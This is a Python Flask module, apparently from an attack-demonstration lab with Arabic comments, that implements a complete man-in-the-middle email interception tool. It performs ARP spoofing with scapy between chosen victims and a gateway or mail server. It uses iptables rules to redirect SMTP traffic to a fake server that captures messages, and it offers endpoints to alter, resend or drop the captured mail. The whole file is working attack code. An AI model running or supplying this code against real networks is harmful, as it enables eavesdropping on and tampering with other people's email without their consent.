# routes/scenario2.py
import subprocess
import os
import time
import threading
import socket
import netifaces
import ipaddress
import socketserver
from flask import Blueprint, jsonify, request, render_template
from scapy.all import ARP, Ether, srp, send, sendp, get_if_hwaddr
from database.db import get_db

bp = Blueprint('scenario2', __name__, url_prefix='/scenario2')

# ========== دوال تنظيف وإعداد iptables ==========
def cleanup_iptables():
    try:
        print("[iptables] تنظيف قواعد redirect القديمة من PREROUTING...")
        subprocess.run(["sudo", "iptables", "-t", "nat", "-F", "PREROUTING"], check=False)
        print("[iptables] تم التنظيف")
    except Exception as e:
        print(f"[iptables] خطأ أثناء التنظيف: {e}")

def setup_forwarding():
    print("[iptables] تفعيل IP Forward")
    subprocess.run(["sudo","sysctl","-w","net.ipv4.ip_forward=1"], check=False)
    subprocess.run(["sudo","iptables","-P","FORWARD","ACCEPT"], check=False)

# ========== متغيرات عامة ==========
mail_intercept_active = False
mail_arp_threads = []
mail_client_a = None
mail_client_b = None
mail_server_real = None
mail_interface = None
fake_smtp_port = 2525
fake_smtp_server = None
fake_smtp_thread = None
current_session = None
session_lock = threading.Lock()

arp_spoof_active = False
arp_victim_ip = None
arp_gateway_ip = None
arp_interface = None
arp_thread = None
arp_stop_flag = lambda: not arp_spoof_active

# ========== دوال مساعدة ==========
def get_mac(ip, interface, timeout=2):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=timeout, iface=interface, verbose=0)
    if ans:
        return ans[0][1].hwsrc
    return None

def disable_ip_forward():
    subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=0'], check=False)

# ========== ARP spoofing ==========
def arp_spoof_pair(ip1, ip2, interface, stop_flag):
    mac1 = get_mac(ip1, interface)
    mac2 = get_mac(ip2, interface)
    attacker_mac = get_if_hwaddr(interface)
    if not mac1 or not mac2:
        print(f"[ARP] تعذر الحصول على MAC لـ {ip1} أو {ip2}")
        return
    print(f"[ARP] بدء التسميم بين {ip1} و {ip2}")
    counter = 0
    while not stop_flag():
        sendp(Ether(src=attacker_mac, dst=mac1)/ARP(op=2, pdst=ip1, hwdst=mac1, psrc=ip2, hwsrc=attacker_mac),
              iface=interface, verbose=0)
        sendp(Ether(src=attacker_mac, dst=mac2)/ARP(op=2, pdst=ip2, hwdst=mac2, psrc=ip1, hwsrc=attacker_mac),
              iface=interface, verbose=0)
        counter += 1
        if counter % 5 == 0:
            print(f"[ARP] لا يزال التسميم نشطاً بين {ip1} و {ip2}")
        time.sleep(2)

def restore_arp_pair(ip1, ip2, interface):
    mac1 = get_mac(ip1, interface)
    mac2 = get_mac(ip2, interface)
    if mac1 and mac2:
        sendp(Ether(dst=mac1)/ARP(op=2, pdst=ip1, hwdst=mac1, psrc=ip2, hwsrc=mac2),
              iface=interface, count=5, inter=0.2, verbose=0)
        sendp(Ether(dst=mac2)/ARP(op=2, pdst=ip2, hwdst=mac2, psrc=ip1, hwsrc=mac1),
              iface=interface, count=5, inter=0.2, verbose=0)

# ========== خادم SMTP الوهمي ==========
class SMTPHandler(socketserver.StreamRequestHandler):
    def handle(self):
        global current_session
        client_ip = self.client_address[0]
        print(f"[SMTP Fake] اتصال جديد من {client_ip}")

        self.wfile.write(b"220 Fake SMTP Server Ready\r\n")

        helo_domain = None
        mail_from = None
        rcpt_to = []
        data_lines = []
        state = "COMMAND"
        connection_alive = True

        self.connection.settimeout(30)  # زيادة المهلة إلى 30 ثانية

        try:
            while connection_alive:
                try:
                    line = self.rfile.readline().decode().strip()
                    if not line and state != "DATA":
                        print("[SMTP Fake] انتهى الاتصال (سطر فارغ في COMMAND)")
                        break
                    
                    print(f"[SMTP Fake] >> {line}")

                    if state == "COMMAND":
                        upper = line.upper()
                        if upper.startswith("HELO") or upper.startswith("EHLO"):
                            parts = line.split()
                            helo_domain = parts[1] if len(parts) > 1 else "unknown"
                            self.wfile.write(b"250 Hello\r\n")
                        elif upper.startswith("MAIL FROM:"):
                            mail_from = line[10:].strip().strip('<>')
                            self.wfile.write(b"250 OK\r\n")
                        elif upper.startswith("RCPT TO:"):
                            rcpt_to.append(line[8:].strip().strip('<>'))
                            self.wfile.write(b"250 OK\r\n")
                        elif upper == "DATA":
                            self.wfile.write(b"354 Start mail input; end with <CRLF>.<CRLF>\r\n")
                            state = "DATA"
                        elif upper == "QUIT":
                            self.wfile.write(b"221 Bye\r\n")
                            break
                        else:
                            self.wfile.write(b"250 OK\r\n")
                    elif state == "DATA":
                        if line == ".":
                            print("[SMTP Fake] تم استلام نقطة النهاية.")
                            session_data = {
                                'client_ip': client_ip,
                                'helo': helo_domain,
                                'mail_from': mail_from,
                                'rcpt_to': rcpt_to,
                                'data': '\n'.join(data_lines)
                            }
                            with session_lock:
                                current_session = session_data
                                print(f"[DEBUG] تم حفظ الرسالة الكاملة: {mail_from} -> {rcpt_to}, عدد الأسطر: {len(data_lines)}")
                            # ── Save to DB so canvas animation sees real attack traffic ──
                            rcpt_str = ', '.join(rcpt_to) if rcpt_to else 'unknown'
                            email_payload = '\n'.join(data_lines)
                            try:
                                with get_db() as db:
                                    db.execute("""
                                        INSERT INTO packets
                                        (src_ip, dst_ip, protocol, length, payload, is_secure, src_port, dst_port)
                                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                                    """, (
                                        mail_from or client_ip,
                                        rcpt_str,
                                        'SMTP (EMAIL)',
                                        len(email_payload),
                                        email_payload[:2000],
                                        0, 0, 25
                                    ))
                                print(f"[SMTP Fake] Packet saved to DB: {mail_from} -> {rcpt_str}")
                            except Exception as db_err:
                                print(f"[SMTP Fake] DB error: {db_err}")
                            self.wfile.write(b"250 2.0.0 Ok: queued\r\n")
                            # بعد DATA، نعود إلى COMMAND لاستقبال أوامر أخرى (مثل QUIT)
                            state = "COMMAND"
                            data_lines = []
                            mail_from = None
                            rcpt_to = []
                        else:
                            data_lines.append(line)
                except socket.timeout:
                    print("[SMTP Fake] مهلة قراءة - إنهاء الاتصال")
                    if state == "DATA" and data_lines:
                        session_data = {
                            'client_ip': client_ip,
                            'helo': helo_domain,
                            'mail_from': mail_from,
                            'rcpt_to': rcpt_to,
                            'data': '\n'.join(data_lines)
                        }
                        with session_lock:
                            current_session = session_data
                            print(f"[DEBUG] تم حفظ البيانات بعد مهلة: {mail_from} -> {rcpt_to}, عدد الأسطر: {len(data_lines)}")
                        # محاولة إرسال استجابة (قد تفشل إذا انقطع الاتصال)
                        try:
                            self.wfile.write(b"250 2.0.0 Ok: queued\r\n")
                            self.wfile.flush()
                        except:
                            pass
                    break
                except Exception as e:
                    print(f"[SMTP Fake] خطأ: {e}")
                    break
        finally:
            if state == "DATA" and data_lines:
                print(f"[SMTP Fake] انقطاع أثناء DATA - حفظ البيانات الجزئية ({len(data_lines)} أسطر)")
                session_data = {
                    'client_ip': client_ip,
                    'helo': helo_domain,
                    'mail_from': mail_from,
                    'rcpt_to': rcpt_to,
                    'data': '\n'.join(data_lines)
                }
                with session_lock:
                    current_session = session_data
                    print(f"[DEBUG] تم حفظ البيانات الجزئية: {mail_from} -> {rcpt_to}")
        print("[SMTP Fake] إنهاء الاتصال مع", client_ip)

class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True

def start_fake_smtp_server(port):
    global fake_smtp_server, fake_smtp_thread
    fake_smtp_server = ThreadedTCPServer(('0.0.0.0', port), SMTPHandler)
    fake_smtp_thread = threading.Thread(target=fake_smtp_server.serve_forever)
    fake_smtp_thread.daemon = True
    fake_smtp_thread.start()
    print(f"[SMTP Fake] خادم وهمي يعمل على المنفذ {port}")

def stop_fake_smtp_server():
    global fake_smtp_server, fake_smtp_thread
    if fake_smtp_server:
        fake_smtp_server.shutdown()
        fake_smtp_server.server_close()
        fake_smtp_server = None
    fake_smtp_thread = None

# ========== دوال iptables ==========
def add_iptables_redirect(client_ip, server_ip, port):
    try:
        cmd = [
            "sudo","iptables","-t","nat","-I","PREROUTING",
            "-s",client_ip,
            "-d",server_ip,
            "-p","tcp",
            "--dport",str(port),
            "-j","REDIRECT",
            "--to-port",str(fake_smtp_port)
        ]
        subprocess.run(cmd, check=False)
        print(f"[iptables] تمت إضافة قاعدة redirect {client_ip} -> {server_ip}:{port}")
    except Exception as e:
        print(f"[iptables] خطأ إضافة القاعدة: {e}")

def remove_iptables_redirect(client_ip, server_ip, port):
    cmd = [
        "sudo","iptables","-t","nat","-D","PREROUTING",
        "-s",client_ip,
        "-d",server_ip,
        "-p","tcp",
        "--dport",str(port),
        "-j","REDIRECT",
        "--to-port",str(fake_smtp_port)
    ]
    subprocess.run(cmd, check=False)

# ========== نقاط نهاية ARP ==========
@bp.route('/start_arp_spoof', methods=['POST'])
def start_arp_spoof():
    global arp_spoof_active, arp_victim_ip, arp_gateway_ip, arp_interface, arp_thread
    data = request.get_json()
    victim = data.get('victim_ip')
    gateway = data.get('gateway_ip')
    interface = data.get('interface', 'eth0')
    if not victim or not gateway:
        return jsonify({'status': 'error', 'message': 'الرجاء إدخال عنوان الضحية والبوابة'}), 400
    if arp_spoof_active:
        return jsonify({'status': 'error', 'message': 'هجوم ARP spoofing قيد التشغيل بالفعل'}), 400
    subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'], check=False)
    arp_spoof_active = True
    arp_victim_ip = victim
    arp_gateway_ip = gateway
    arp_interface = interface
    def stop_flag():
        return not arp_spoof_active
    arp_thread = threading.Thread(target=arp_spoof_pair, args=(victim, gateway, interface, stop_flag))
    arp_thread.daemon = True
    arp_thread.start()
    return jsonify({'status': 'success', 'message': f'بدء هجوم ARP spoofing بين {victim} و {gateway}'})

@bp.route('/stop_arp_spoof', methods=['POST'])
def stop_arp_spoof():
    global arp_spoof_active, arp_victim_ip, arp_gateway_ip, arp_interface, arp_thread
    if not arp_spoof_active:
        return jsonify({'status': 'error', 'message': 'لا يوجد هجوم ARP spoofing نشط'}), 400
    arp_spoof_active = False
    if arp_thread and arp_thread.is_alive():
        arp_thread.join(timeout=3)
    if arp_victim_ip and arp_gateway_ip and arp_interface:
        restore_arp_pair(arp_victim_ip, arp_gateway_ip, arp_interface)
    subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=0'], check=False)
    arp_victim_ip = arp_gateway_ip = arp_interface = None
    arp_thread = None
    return jsonify({'status': 'success', 'message': 'تم إيقاف هجوم ARP spoofing واستعادة الجداول'})

@bp.route('/arp_status', methods=['GET'])
def arp_status():
    if arp_spoof_active:
        return jsonify({'status': 'active', 'victim': arp_victim_ip, 'gateway': arp_gateway_ip})
    return jsonify({'status': 'inactive'})

# ========== نقاط نهاية اعتراض البريد ==========
@bp.route('/')
def index():
    return render_template('scenario2.html')

@bp.route('/scan_network', methods=['POST'])
def scan_network():
    data = request.get_json()
    interface = data.get('interface', 'eth0')
    try:
        addrs = netifaces.ifaddresses(interface)
        ip_info = addrs[netifaces.AF_INET][0]
        network = ipaddress.IPv4Network(f"{ip_info['addr']}/{ip_info['netmask']}", strict=False)
        arp_request = ARP(pdst=str(network))
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        answered = srp(broadcast/arp_request, timeout=5, iface=interface, verbose=0)[0]
        devices = [{'ip': rcv.psrc, 'mac': rcv.hwsrc} for _, rcv in answered]
        return jsonify({'status': 'success', 'devices': devices})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@bp.route('/start_mail_intercept', methods=['POST'])
def start_mail_intercept():
    global mail_intercept_active, mail_arp_threads, mail_client_a, mail_client_b, mail_server_real
    global mail_interface, current_session
    data = request.get_json()
    client_a = data.get('client_a')
    client_b = data.get('client_b')
    server = data.get('server')
    interface = data.get('interface', 'eth0')
    server_is_recipient = data.get('server_is_recipient', False)
    if not client_a or not server:
        return jsonify({'status': 'error', 'message': 'الرجاء إدخال عنوان العميل A والخادم'}), 400
    if not server_is_recipient and not client_b:
        return jsonify({'status': 'error', 'message': 'الرجاء إدخال عنوان العميل B أو تفعيل خيار أن الخادم هو المستلم'}), 400
    if mail_intercept_active:
        return jsonify({'status': 'error', 'message': 'اعتراض البريد قيد التشغيل بالفعل'}), 400
    cleanup_iptables()
    setup_forwarding()
    try:
        start_fake_smtp_server(fake_smtp_port)
    except Exception as e:
        return jsonify({'status': 'error', 'message': f'فشل بدء خادم SMTP الوهمي: {e}'}), 500
    with session_lock:
        current_session = None
    mail_client_a = client_a
    mail_server_real = server
    mail_interface = interface
    mail_intercept_active = True
    if server_is_recipient:
        mail_client_b = server
    else:
        mail_client_b = client_b
    stop_flag = lambda: not mail_intercept_active
    t1 = threading.Thread(target=arp_spoof_pair, args=(mail_client_a, mail_server_real, interface, stop_flag))
    t1.daemon = True
    t1.start()
    mail_arp_threads.append(t1)
    if not server_is_recipient:
        t2 = threading.Thread(target=arp_spoof_pair, args=(mail_client_b, mail_server_real, interface, stop_flag))
        t2.daemon = True
        t2.start()
        mail_arp_threads.append(t2)
    add_iptables_redirect(mail_client_a, mail_server_real, 25)
    if not server_is_recipient:
        add_iptables_redirect(mail_client_b, mail_server_real, 25)
    return jsonify({'status': 'success', 'message': f'بدأ اعتراض البريد بين {mail_client_a} و {mail_server_real} (المستلم: {"الخادم نفسه" if server_is_recipient else mail_client_b})'})

@bp.route('/stop_mail_intercept', methods=['POST'])
def stop_mail_intercept():
    global mail_intercept_active, mail_arp_threads, mail_client_a, mail_client_b, mail_server_real
    global mail_interface, current_session
    if not mail_intercept_active:
        return jsonify({'status': 'error', 'message': 'لا يوجد اعتراض بريد نشط'}), 400
    mail_intercept_active = False
    time.sleep(2)
    if mail_client_a and mail_server_real:
        remove_iptables_redirect(mail_client_a, mail_server_real, 25)
    if mail_client_b and mail_server_real and mail_client_b != mail_server_real:
        remove_iptables_redirect(mail_client_b, mail_server_real, 25)
    if mail_client_a and mail_server_real and mail_interface:
        restore_arp_pair(mail_client_a, mail_server_real, mail_interface)
    if mail_client_b and mail_server_real and mail_client_b != mail_server_real:
        restore_arp_pair(mail_client_b, mail_server_real, mail_interface)
    stop_fake_smtp_server()
    mail_client_a = mail_client_b = mail_server_real = mail_interface = None
    with session_lock:
        current_session = None
    mail_arp_threads.clear()
    return jsonify({'status': 'success', 'message': 'تم إيقاف اعتراض البريد'})

@bp.route('/get_mail_message', methods=['GET'])
def get_mail_message():
    with session_lock:
        if current_session:
            data_len = len(current_session.get('data', ''))
            print(f"[DEBUG] إرجاع رسالة: {current_session.get('mail_from')} -> {current_session.get('rcpt_to')}, حجم البيانات: {data_len}")
            return jsonify({'status': 'success', 'message': current_session})
        else:
            print("[DEBUG] لا توجد رسالة حالياً")
    return jsonify({'status': 'waiting'})

@bp.route('/debug_session', methods=['GET'])
def debug_session():
    with session_lock:
        if current_session:
            return jsonify({'status': 'has_session', 'session': current_session})
        else:
            return jsonify({'status': 'no_session'})

@bp.route('/send_modified_mail', methods=['POST'])
def send_modified_mail():
    global current_session
    data = request.get_json()
    modified_payload = data.get('payload')
    with session_lock:
        if not current_session:
            return jsonify({'status': 'error', 'message': 'لا توجد رسالة بريد معترضة'}), 400
        session = current_session.copy()
        current_session = None
        print("[DEBUG] تم مسح current_session بعد إرسال معدل")
    try:
        if not mail_server_real:
            return jsonify({'status': 'error', 'message': 'عنوان الخادم الحقيقي غير معروف'}), 400
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(30)
        sock.connect((mail_server_real, 25))
        banner = sock.recv(1024).decode()
        print("[SMTP Client] Banner:", banner)
        sock.send(f"HELO {session['helo']}\r\n".encode())
        sock.recv(1024).decode()
        sock.send(f"MAIL FROM:<{session['mail_from']}>\r\n".encode())
        sock.recv(1024).decode()
        for rcpt in session['rcpt_to']:
            sock.send(f"RCPT TO:<{rcpt}>\r\n".encode())
            sock.recv(1024).decode()
        sock.send(b"DATA\r\n")
        sock.recv(1024).decode()
        sock.send(f"{modified_payload}\r\n.\r\n".encode())
        sock.recv(1024).decode()
        sock.send(b"QUIT\r\n")
        sock.close()
        return jsonify({'status': 'success', 'message': 'تم إرسال الرسالة المعدلة إلى الخادم الحقيقي'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@bp.route('/resend_original_mail', methods=['POST'])
def resend_original_mail():
    global current_session
    with session_lock:
        if not current_session:
            return jsonify({'status': 'error', 'message': 'لا توجد رسالة بريد معترضة'}), 400
        session = current_session.copy()
        current_session = None
        print("[DEBUG] تم مسح current_session بعد إعادة إرسال")
    try:
        if not mail_server_real:
            return jsonify({'status': 'error', 'message': 'عنوان الخادم الحقيقي غير معروف'}), 400
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(30)
        sock.connect((mail_server_real, 25))
        banner = sock.recv(1024).decode()
        print("[SMTP Client] Banner:", banner)
        sock.send(f"HELO {session['helo']}\r\n".encode())
        sock.recv(1024).decode()
        sock.send(f"MAIL FROM:<{session['mail_from']}>\r\n".encode())
        sock.recv(1024).decode()
        for rcpt in session['rcpt_to']:
            sock.send(f"RCPT TO:<{rcpt}>\r\n".encode())
            sock.recv(1024).decode()
        sock.send(b"DATA\r\n")
        sock.recv(1024).decode()
        sock.send(f"{session['data']}\r\n.\r\n".encode())
        sock.recv(1024).decode()
        sock.send(b"QUIT\r\n")
        sock.close()
        return jsonify({'status': 'success', 'message': 'تم إعادة إرسال الرسالة الأصلية'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@bp.route('/drop_mail', methods=['POST'])
def drop_mail():
    global current_session
    with session_lock:
        current_session = None
        print("[DEBUG] تم مسح current_session بعد تجاهل الرسالة")
    return jsonify({'status': 'success', 'message': 'تم تجاهل الرسالة'})

# ========== نقاط نهاية إضافية ==========
@bp.route('/check_iptables', methods=['GET'])
def check_iptables():
    try:
        result = subprocess.run(['sudo', 'iptables', '-t', 'nat', '-L', '-n', '-v'], capture_output=True, text=True)
        return jsonify({'status': 'success', 'rules': result.stdout})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@bp.route('/check_arp_status', methods=['GET'])
def check_arp_status():
    if mail_intercept_active:
        return jsonify({'status': 'active', 'message': f'ARP spoofing بين {mail_client_a} و {mail_server_real}' + (f' و {mail_client_b}' if mail_client_b != mail_server_real else '')})
    return jsonify({'status': 'inactive'})

# ========== دالة التنظيف ==========
def cleanup():
    global mail_intercept_active, arp_spoof_active
    if mail_intercept_active:
        print("🧹 تنظيف اعتراض البريد...")
        mail_intercept_active = False
        time.sleep(1)
        if mail_client_a and mail_server_real and mail_interface:
            restore_arp_pair(mail_client_a, mail_server_real, mail_interface)
        if mail_client_b and mail_server_real and mail_client_b != mail_server_real:
            restore_arp_pair(mail_client_b, mail_server_real, mail_interface)
        if mail_client_a and mail_server_real:
            remove_iptables_redirect(mail_client_a, mail_server_real, 25)
        if mail_client_b and mail_server_real and mail_client_b != mail_server_real:
            remove_iptables_redirect(mail_client_b, mail_server_real, 25)
        stop_fake_smtp_server()
        print("✅ تنظيف اعتراض البريد تم")
    if arp_spoof_active:
        print("🧹 تنظيف ARP spoofing العام...")
        arp_spoof_active = False
        time.sleep(1)
        if arp_victim_ip and arp_gateway_ip and arp_interface:
            restore_arp_pair(arp_victim_ip, arp_gateway_ip, arp_interface)
        disable_ip_forward()
        print("✅ تنظيف ARP spoofing تم")
